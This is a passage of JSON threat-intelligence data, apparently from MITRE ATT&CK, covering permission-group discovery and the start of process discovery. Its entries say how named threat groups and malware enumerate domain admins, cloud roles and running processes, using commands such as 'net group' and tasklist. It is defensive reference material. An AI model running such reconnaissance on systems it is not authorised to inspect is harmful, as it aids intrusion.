                        "Name": "Volt Typhoon",
                        "Description": "<name> has run net localgroup administrators in compromised environments to enumerate accounts.[30]"
                    }
                }
            },
            "002": {
                "name": "Domain Groups",
                "href": "/techniques/T1069/002",
                "description": "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.Commands such as net group /domain of the Net utility,  dscacheutil -q group on macOS, and ldapsearch on Linux can list domain-level groups.",
                "Procedure": {
                    "S0552": {
                        "ID": "S0552",
                        "Name": "AdFind",
                        "Description": "<name> can enumerate domain groups.[1][2][3][4]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can use net.exe group \"domain admins\" /domain to identify Domain Administrators.[5]"
                    },
                    "S1068": {
                        "ID": "S1068",
                        "Name": "BlackCat",
                        "Description": "<name> can determine if a user on a compromised host has domain admin privileges.[6]"
                    },
                    "S0521": {
                        "ID": "S0521",
                        "Name": "BloodHound",
                        "Description": "<name> can collect information about domain groups and members.[7]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> can use net group for discovery on targeted domains.[8]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, the threat actors use the command net group \"domain admins\" /dom to enumerate domain groups.[9]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can identify targets by querying account groups on a domain contoller.[10]"
                    },
                    "S0488": {
                        "ID": "S0488",
                        "Name": "CrackMapExec",
                        "Description": "<name> can gather the user accounts within domain groups.[11]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has used batch scripts to enumerate administrators and users in the domain.[12]"
                    },
                    "S0105": {
                        "ID": "S0105",
                        "Name": "dsquery",
                        "Description": "<name> can be used to gather information on permission groups within a domain.[13][14]"
                    },
                    "S0554": {
                        "ID": "S0554",
                        "Name": "Egregor",
                        "Description": "<name> can conduct Active Directory reconnaissance using tools such as Sharphound or AdFind.[15]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has used the command net group \"domain admins\" /domain to enumerate domain groups.[16]"
                    },
                    "S0417": {
                        "ID": "S0417",
                        "Name": "GRIFFON",
                        "Description": "<name> has used a reconnaissance module that can be used to retrieve Windows domain membership information.[17]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "<name> has checked for the domain admin group and Exchange Trusted Subsystem groups using the commands net group Exchange Trusted Subsystem /domain and net group domain admins /domain.[18]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> has used specific malware modules to gather domain membership.[19]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> performs discovery of permission groups net group /domain.[20]"
                    },
                    "S0236": {
                        "ID": "S0236",
                        "Name": "Kwampirs",
                        "Description": "<name> collects a list of domain groups with the command net localgroup /domain.[21]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has used the AD Explorer tool to enumerate groups on a victim's network.[22]"
                    },
                    "S0039": {
                        "ID": "S0039",
                        "Name": "Net",
                        "Description": "Commands such as net group /domain can be used in <name> to gather information about and manipulate groups.[23]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used net group /domain, net group \"domain admins\" /domain, and net group \"Exchange Trusted Subsystem\" /domain to find domain group permission settings.[24]"
                    },
                    "S0165": {
                        "ID": "S0165",
                        "Name": "OSInfo",
                        "Description": "<name> specifically looks for Domain Admins and power users within the domain.[25]"
                    },
                    "S0184": {
                        "ID": "S0184",
                        "Name": "POWRUNER",
                        "Description": "<name> may collect domain group information by running net group /domain or a series of other commands on a victim.[26]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> can identify the domain membership of a compromised host.[27][28][29]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can use System.DirectoryServices namespace to retrieve domain group information.[30]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used AdFind to enumerate domain groups.[31]"
                    },
                    "S0516": {
                        "ID": "S0516",
                        "Name": "SoreFang",
                        "Description": "<name> can enumerate domain groups by executing net.exe group /domain.[32]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> has executed net group \"domain admins\" /dom for discovery on compromised machines.[33]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used net group \"Domain Admins\" /domain to identify domain administrators.[34]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has run net group in compromised environments to discover domain groups.[35]"
                    },
                    "S0514": {
                        "ID": "S0514",
                        "Name": "WellMess",
                        "Description": "<name> can identify domain group membership for the current user.[36]"
                    }
                }
            },
            "003": {
                "name": "Cloud Groups",
                "href": "/techniques/T1069/003",
                "description": "Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.With authenticated access there are several tools that can be used to find permissions groups. The Get-MsolRole PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts [1][2].Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command az ad user get-member-groups will list groups associated to a user account for Azure while the API endpoint GET https://cloudidentity.googleapis.com/v1/groups lists group resources available to a user for Google.[3][4][5] In AWS, the commands ListRolePolicies and ListAttachedRolePolicies allow users to enumerate the policies attached to a role.[6]Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS GetBucketAcl API [7]. Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",
                "Procedure": {
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> can enumerate Azure AD groups.[8]"
                    },
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider accessed Azure AD to download bulk lists of group members and their Active Directory attributes.[9]"
                    },
                    "S1091": {
                        "ID": "S1091",
                        "Name": "Pacu",
                        "Description": "<name> can enumerate IAM permissions.[10]"
                    },
                    "S0684": {
                        "ID": "S0684",
                        "Name": "ROADTools",
                        "Description": "<name> can enumerate Azure AD groups.[11]"
                    }
                }
            }
        },
        "tactic": "Discovery",
        "description": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.Adversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.[1]",
        "Procedure": {
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "malware has a tool that can enumerate the permissions associated with Windows groups.[2]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used net group commands to enumerate various Windows user groups and permissions.[3]"
            },
            "S0335": {
                "ID": "S0335",
                "Name": "Carbon",
                "Description": "malware uses the net group command.[4]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has enumerated all users and roles from a victim's main treasury system.[5]"
            },
            "S0483": {
                "ID": "S0483",
                "Name": "IcedID",
                "Description": "malware has the ability to identify Workgroup membership.[6]"
            },
            "S0233": {
                "ID": "S0233",
                "Name": "MURKYTOP",
                "Description": "malware has the capability to retrieve information about groups.[7]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware gathered the local privileges for the infected host.[8]"
            },
            "S0623": {
                "ID": "S0623",
                "Name": "Siloscape",
                "Description": "malware checks for Kubernetes node permissions.[9]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 used the Get-ManagementRoleAssignment PowerShell cmdlet to enumerate Exchange management role assignments through an Exchange Management Shell.[10]"
            },
            "G0092": {
                "ID": "G0092",
                "Name": "TA505",
                "Description": "malware has used TinyMet to enumerate members of privileged groups.[11] malware has also run net group /domain.[12]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware can identify the groups the user on a compromised host belongs to.[13]"
            }
        }
    },
    "T1057": {
        "ttp_name": "Process Discovery",
        "ttp_id": "T1057",
        "href": "/techniques/T1057",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.In Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc. On network devices, Network Device CLI commands such as show processes can be used to display current running processes.[1][2]",
        "Procedure": {
            "S0065": {
                "ID": "S0065",
                "Name": "4H RAT",
                "Description": "malware has the capability to obtain a listing of running processes (including loaded modules).[3]"
            },
            "S0045": {
                "ID": "S0045",
                "Name": "ADVSTORESHELL",
                "Description": "malware can list running processes.[4]"
            },
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware can list the current running processes on the system.[5]"
            },
            "S1129": {
                "ID": "S1129",
                "Name": "Akira",
                "Description": "malware verifies the deletion of volume shadow copies by checking for the existence of the process ID related to the process created to delete these items.[6]"
            },
            "G0138": {
                "ID": "G0138",
                "Name": "Andariel",
                "Description": "malware has used tasklist to enumerate processes and find a specific string.[7]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware can enumerate the current process on a compromised host.[8]"
            },
            "G0006": {
                "ID": "G0006",
                "Name": "APT1",
                "Description": "malware gathered a list of running processes on the system using tasklist /v.[9]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "An malware loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.[10]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "malware has a tool that can list out currently running processes.[11][12]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware's Freenki malware lists running processes using the Microsoft Windows API.[13]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware leveraged Sysmon to understand the processes, services in the organization.[14]"
            },
            "G1023": {
                "ID": "G1023",
                "Name": "APT5",
                "Description": "malware has used Windows-based utilities to carry out tasks including tasklist.exe. [15]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to enumerate loaded modules for a process.[16]."
            },
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware searches for different processes on the system.[17]"
            },
            "S1087": {
                "ID": "S1087",
                "Name": "AsyncRAT",
                "Description": "malware can examine running processes to determine if a debugger is present.[18]"
            },
            "S0640": {
                "ID": "S0640",
                "Name": "Avaddon",
                "Description": "malware has collected information about running processes.[19]"
            },
            "S0473": {
                "ID": "S0473",
                "Name": "Avenger",
                "Description": "malware has the ability to use Tasklist to identify running processes.[20]"
            },
            "S1053": {
                "ID": "S1053",
                "Name": "AvosLocker",
                "Description": "malware has discovered system processes by calling RmGetList.[21]"
            },
            "S0344": {
                "ID": "S0344",
                "Name": "Azorult",
                "Description": "malware can collect a list of running processes by calling CreateToolhelp32Snapshot.[22][23]"
            },
            "S0638": {
                "ID": "S0638",
                "Name": "Babuk",
                "Description": "malware has the ability to check running processes on a targeted system.[24][25][26]"
            },
            "S0414": {
                "ID": "S0414",
                "Name": "BabyShark",
                "Description": "malware has executed the tasklist command.[27]"
            },
            "S0093": {
                "ID": "S0093",
                "Name": "Backdoor.Oldrea",
                "Description": "malware collects information about running processes.[28]"
            },
            "S0031": {
                "ID": "S0031",
                "Name": "BACKSPACE",
                "Description": "malware may collect information about running processes.[29]"
            },
            "S0606": {
                "ID": "S0606",
                "Name": "Bad Rabbit",
                "Description": "malware can enumerate all running processes to compare hashes.[30]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can retrieve a list of running processes from a compromised machine.[31]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware identifies processes and collects the process ids.[32]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can identity the current process on a compromised host.[33]"
            },
            "S0127": {
                "ID": "S0127",
                "Name": "BBSRAT",
                "Description": "malware can list running processes.[34]"
            },
            "S0017": {
                "ID": "S0017",
                "Name": "BISCUIT",
                "Description": "malware has a command to enumerate running processes and identify their owners.[35]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware can obtain a list of running processes on the victim\u2019s machine.[36][37][38]"
            },
            "S0069": {
                "ID": "S0069",
                "Name": "BLACKCOFFEE",
                "Description": "malware has the capability to discover processes.[39]"
            },
            "S0089": {
                "ID": "S0089",
                "Name": "BlackEnergy",
                "Description": "malware has gathered a process list by using Tasklist.exe.[40][41][42]"
            },
            "S0657": {
                "ID": "S0657",
                "Name": "BLUELIGHT",
                "Description": "malware can collect process filenames and SID authority level.[43]"
            },
            "S0486": {
                "ID": "S0486",
                "Name": "Bonadan",
                "Description": "malware can use the ps command to discover other cryptocurrency miners active on the system.[44]"
            },
            "S0252": {
                "ID": "S0252",
                "Name": "Brave Prince",
                "Description": "malware lists the running processes.[45]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware can enumerate all processes and locate specific process IDs (PIDs).[46]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can identify processes associated with analytical tools.[47][48][49]"
            },
            "S0482": {
                "ID": "S0482",
                "Name": "Bundlore",
                "Description": "malware has used the ps command to list processes.[50]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors used the tasklist /s command as well as taskmanager to obtain a list of running processes.[51]"
            },
            "S0693": {
                "ID": "S0693",
                "Name": "CaddyWiper",
                "Description": "malware can obtain a list of current processes.[52]"
            },
            "S0351": {
                "ID": "S0351",
                "Name": "Cannon",
                "Description": "malware can obtain a list of processes running on the system.[53][54]"
            },
            "S0030": {
                "ID": "S0030",
                "Name": "Carbanak",
                "Description": "malware lists running processes.[55]"
            },
            "S0484": {
                "ID": "S0484",
                "Name": "Carberp",
                "Description": "malware has collected a list of running processes.[56]"
            },
            "S0335": {
                "ID": "S0335",
                "Name": "Carbon",
                "Description": "malware can list the processes on the victim\u2019s machine.[57]"
            },
            "S0348": {
                "ID": "S0348",
                "Name": "Cardinal RAT",
                "Description": "malware contains watchdog functionality that ensures its process is always running, else spawns a new instance.[58]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware can gather a list of processes running on the machine.[59]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware has the ability to list running processes through the use of tasklist.[60]"
            },
            "S0144": {
                "ID": "S0144",
                "Name": "ChChes",
                "Description": "malware collects its process identifier (PID) on the victim.[61]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used tasklist to enumerate processes.[62]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware can enumerate processes on a targeted system.[63]"
            },
            "S0611": {
                "ID": "S0611",
                "Name": "Clop",
                "Description": "malware can enumerate all processes on the victim's machine.[64]"
            },
            "S1105": {
                "ID": "S1105",
                "Name": "COATHANGER",
                "Description": "malware will query running process information to determine subsequent program execution flow.[65]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware's Beacon payload can collect information on process details.[66][67][68]"
            },
            "S0244": {
                "ID": "S0244",
                "Name": "Comnie",
                "Description": "malware uses the tasklist to view running processes on the victim\u2019s machine.[69]"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware can enumerate through all open processes to search for any that have the string \"sql\" in their process name.[70]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware contains a command to list processes.[71][72][73]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware can enumerate processes running on a victim's machine.[74]"
            },
            "S0687": {
                "ID": "S0687",
                "Name": "Cyclops Blink",
                "Description": "malware can enumerate the process it is currently running under.[75]"
            },
            "S0497": {
                "ID": "S0497",
                "Name": "Dacls",
                "Description": "malware can collect data on running and parent processes.[76]"
            },
            "S0334": {
                "ID": "S0334",
                "Name": "DarkComet",
                "Description": "malware can list active processes running on the victim\u2019s machine.[77]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware performs various checks for running processes, including security software by looking for hard-coded process name values.[78]"
            },
            "G0012": {
                "ID": "G0012",
                "Name": "Darkhotel",
                "Description": "malware malware can collect a list of running processes on a system.[79]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware can enumerate a list of running processes on a compromised system.[80]"
            },
            "G0009": {
                "ID": "G0009",
                "Name": "Deep Panda",
                "Description": "malware uses the Microsoft Tasklist utility to list processes running on systems.[81]"
            },
            "S0021": {
                "ID": "S0021",
                "Name": "Derusbi",
                "Description": "malware collects current and parent process IDs.[82][83]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware has used CreateToolhelp32Snapshot, Process32First, and Process32Next API calls to enumerate the running processes in the system.[84]"
            },
            "S0600": {
                "ID": "S0600",
                "Name": "Doki",
                "Description": "malware has searched for the current process\u2019s PID.[85]"
            },
            "S0695": {
                "ID": "S0695",
                "Name": "Donut",
                "Description": "malware includes subprojects that enumerate and identify information about Process Injection candidates.[86]"
            },
            "S0472": {
                "ID": "S0472",
                "Name": "down_new",
                "Description": "malware has the ability to list running processes on a compromised host.[20]"
            },
            "S0694": {
                "ID": "S0694",
                "Name": "DRATzarus",
                "Description": "malware can enumerate and examine running processes to determine if a debugger is present.[87]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware\u2019s dropper can list all running processes.[88][89]"
            },
            "S0038": {
                "ID": "S0038",
                "Name": "Duqu",
                "Description": "The discovery modules used with malware can collect information on process details.[90]"
            },
            "S0062": {
                "ID": "S0062",
                "Name": "DustySky",
                "Description": "malware collects information about running processes from victims.[91][92]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware has used Tasklist to obtain information from a compromised host.[93]"
            },
            "S0605": {
                "ID": "S0605",
                "Name": "EKANS",
                "Description": "malware looks for processes from a hard-coded list.[94][95][96]"
            },
            "S0081": {
                "ID": "S0081",
                "Name": "Elise",
                "Description": "malware enumerates processes via the tasklist command.[97]"
            },
            "S0064": {
                "ID": "S0064",
                "Name": "ELMER",
                "Description": "malware is capable of performing process listings.[98]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has been observed enumerating local processes.[99]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can find information about processes running on local and remote systems.[100][101]"
            },
            "S0091": {
                "ID": "S0091",
                "Name": "Epic",
                "Description": "malware uses the tasklist /v command to obtain a list of processes.[102][103]"
            },
            "S0396": {
                "ID": "S0396",
                "Name": "EvilBunny",
                "Description": "malware has used EnumProcesses() to identify how many process are running in the environment.[104]"
            },
            "S0512": {
                "ID": "S0512",
                "Name": "FatDuke",
                "Description": "malware can list running processes on the localhost.[105]"
            },
            "S0267": {
                "ID": "S0267",
                "Name": "FELIXROOT",
                "Description": "malware collects a list of running processes.[106]"
            },
            "S0355": {
                "ID": "S0355",
                "Name": "Final1stspy",
                "Description": "malware obtains a list of running processes.[107]"
            },
            "S0182": {
                "ID": "S0182",
                "Name": "FinFisher",
                "Description": "malware checks its parent process for indications that it is running in a sandbox setup.[108][109]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware has been used to run the tasklist command on a compromised system.[110]"
            },
            "S0661": {
                "ID": "S0661",
                "Name": "FoggyWeb",
                "Description": "malware's loader can enumerate all Common Language Runtimes (CLRs) and running Application Domains in the compromised AD FS server's Microsoft.IdentityServer.ServiceHost.exe process.[111]"
            },
            "S0503": {
                "ID": "S0503",
                "Name": "FrameworkPOS",
                "Description": "malware can enumerate and exclude selected processes on a compromised host to speed execution of memory scraping.[112]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors used Empire to obtain a list of all running processes.[101]"
            },
            "S0277": {
                "ID": "S0277",
                "Name": "FruitFly",
                "Description": "malware has the ability to list processes on the system.[113]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware has the ability to discover processes, including Bka.exe and BkavUtil.exe.[114]"
            },
            "C0007": {
                "ID": "C0007",
                "Name": "FunnyDream",
                "Description": "During malware, the threat actors used Tasklist on targeted systems.[114]"
            },
            "S0410": {
                "ID": "S0410",
                "Name": "Fysbis",
                "Description": "malware can collect information about running processes.[115]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has used tools to enumerate processes on target hosts including Process Explorer.[116][117]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can enumerate running processes.[118]"
            },
            "S0049": {
                "ID": "S0049",
                "Name": "GeminiDuke",
                "Description": "malware collects information on running processes and environment variables from the victim.[119]"
            },
            "S0460": {
                "ID": "S0460",
                "Name": "Get2",
                "Description": "malware has the ability to identify running processes on an infected host.[120]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware has the capability to list processes.[121]"
            },
            "S0249": {
                "ID": "S0249",
                "Name": "Gold Dragon",
                "Description": "malware checks the running processes on the victim\u2019s machine.[45]"
            },
            "S0477": {
                "ID": "S0477",
                "Name": "Goopy",
                "Description": "malware has checked for the Google Updater process to ensure malware was loaded properly.[122]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can identify installed security tools based on process names.[123]"
            },
            "S0237": {
                "ID": "S0237",
                "Name": "GravityRAT",
                "Description": "malware lists the running processes on the system.[124]"
            },
            "G0125": {
                "ID": "G0125",
                "Name": "HAFNIUM",
                "Description": "malware has used tasklist to enumerate processes.[125]"
            },
            "S0151": {
                "ID": "S0151",
                "Name": "HALFBAKED",
                "Description": "malware can obtain information about running processes on the victim.[126]"
            },
            "S0617": {
                "ID": "S0617",
                "Name": "HELLOKITTY",
                "Description": "malware can search for specific processes to terminate.[127]"
            },
            "S0170": {
                "ID": "S0170",
                "Name": "Helminth",
                "Description": "malware has used Tasklist to get information on processes.[10]"
            },
            "G1001": {
                "ID": "G1001",
                "Name": "HEXANE",
                "Description": "malware has enumerated processes on targeted systems.[128]"
            },
            "S1027": {
                "ID": "S1027",
                "Name": "Heyoka Backdoor",
                "Description": "malware can gather process information.[129]"
            },
            "G0126": {
                "ID": "G0126",
                "Name": "Higaisa",
                "Description": "malware\u2019s shellcode attempted to find the process ID of the current process.[130]"
            },
            "S0431": {
                "ID": "S0431",
                "Name": "HotCroissant",
                "Description": "malware has the ability to list running processes on the infected host.[131]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware creates a backdoor through which remote attackers can monitor processes.[132][133]"
            },
            "S0278": {
                "ID": "S0278",
                "Name": "iKitten",
                "Description": "malware lists the current processes running.[113]"
            },
            "S0434": {
                "ID": "S0434",
                "Name": "Imminent Monitor",
                "Description": "malware has a \"Process Watcher\" feature to monitor processes in case the client ever crashes or gets closed.[134]"
            },
            "G0100": {
                "ID": "G0100",
                "Name": "Inception",
                "Description": "malware has used a reconnaissance module to identify active processes and other associated loaded modules.[135]"
            },
            "S1072": {
                "ID": "S1072",
                "Name": "Industroyer2",
                "Description": "malware has the ability to cyclically enumerate running processes such as PServiceControl.exe, PService_PDD.exe, and other targets supplied through a hardcoded configuration.[136]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can obtain a list of running processes.[137][138]"
            },
            "S0581": {
                "ID": "S0581",
                "Name": "IronNetInjector",
                "Description": "malware can identify processes via C# methods such as GetProcessesByName and running Tasklist with the Python os.popen function.[139]"
            },
            "S0015": {
                "ID": "S0015",
                "Name": "Ixeshe",
                "Description": "malware can list running processes.[140]"
            },
            "S0528": {
                "ID": "S0528",
                "Name": "Javali",
                "Description": "malware can monitor processes for open browsers and custom banking applications.[141]"
            },
            "S0044": {
                "ID": "S0044",
                "Name": "JHUHUGIT",
                "Description": "malware obtains a list of running processes on the victim.[142][143]"
            },
            "S0201": {
                "ID": "S0201",
                "Name": "JPIN",
                "Description": "malware can list running processes.[144]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware can query and kill system processes.[145]"
            },
            "S0088": {
                "ID": "S0088",
                "Name": "Kasidet",
                "Description": "malware has the ability to search for a given process name in processes currently running in the system.[146]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware obtains a list of running processes through WMI querying and the ps command.[147]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware performs process discovery using tasklist commands.[148][149]"
            },
            "S0271": {
                "ID": "S0271",
                "Name": "KEYMARBLE",
                "Description": "malware can obtain a list of running processes on the system.[150]"
            },
            "S0607": {
                "ID": "S0607",
                "Name": "KillDisk",
                "Description": "malware has called GetCurrentProcess.[151]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware can gather a list of all processes running on a victim's machine.[152]"
            },
            "S0599": {
                "ID": "S0599",
                "Name": "Kinsing",
                "Description": "malware has used ps to list processes.[153]"
            },
            "S0162": {
                "ID": "S0162",
                "Name": "Komplex",
                "Description": "The OsInfo function in malware collects a running process list.[154]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware has used the command cmd /c tasklist to get a snapshot of the current processes on the target machine.[155][156]"
            },
            "S1075": {
                "ID": "S1075",
                "Name": "KOPILUWAK",
                "Description": "malware can enumerate current running processes on the targeted machine.[157]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware collects a list of running services with the command tasklist /v.[158]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "Several malware malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by malware also gathers process times.[159][160][161][162][76][163]"
            },
            "S0211": {
                "ID": "S0211",
                "Name": "Linfo",
                "Description": "malware creates a backdoor through which remote attackers can retrieve a list of running processes.[164]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware has a plugin designed to obtain a list of processes.[165][166]"
            },
            "S0582": {
                "ID": "S0582",
                "Name": "LookBack",
                "Description": "malware can list running processes.[167]"
            },
            "S0451": {
                "ID": "S0451",
                "Name": "LoudMiner",
                "Description": "malware used the ps command to monitor the running processes on the system.[168]"
            },
            "S0532": {
                "ID": "S0532",
                "Name": "Lucifer",
                "Description": "malware can identify the process that owns remote connections.[169]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware has a component to check for running processes to look for web browsers.[170]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware can enumerate running processes.[171]"
            },
            "S1048": {
                "ID": "S1048",
                "Name": "macOS.OSAMiner",
                "Description": "malware has used ps ax | grep <name> | grep -v grep | ... and ps ax | grep -E... to conduct process discovery.[172]"
            },
            "S1060": {
                "ID": "S1060",
                "Name": "Mafalda",
                "Description": "malware can enumerate running processes on a machine.[173]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware malware can list running processes.[174]"
            },
            "S0652": {
                "ID": "S0652",
                "Name": "MarkiRAT",
                "Description": "malware can search for different processes on a system.[175]"
            },
            "S0449": {
                "ID": "S0449",
                "Name": "Maze",
                "Description": "malware has gathered all of the running system processes.[176]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware can enumerate the processes that run on the platform.[173][177]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has performed process name checks and has monitored applications.[178]"
            },
            "S0688": {
                "ID": "S0688",
                "Name": "Meteor",
                "Description": "malware can check if a specific process is running, such as Kaspersky's avp.exe.[179]"
            },
            "S1122": {
                "ID": "S1122",
                "Name": "Mispadu",
                "Description": "malware can enumerate the running processes on a compromised host.[180]"
            },
            "S0079": {
                "ID": "S0079",
                "Name": "MobileOrder",
                "Description": "malware has a command to upload information about all running processes to its C2 server.[181]"
            },
            "G0021": {
                "ID": "G0021",
                "Name": "Molerats",
                "Description": "malware actors obtained a list of active processes on the victim and sent them to C2 servers.[91]"
            },
            "S0149": {
                "ID": "S0149",
                "Name": "MoonWind",
                "Description": "malware has a command to return a list of running processes.[182]"
            },
            "S0256": {
                "ID": "S0256",
                "Name": "Mosquito",
                "Description": "malware runs tasklist to obtain running processes.[183]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
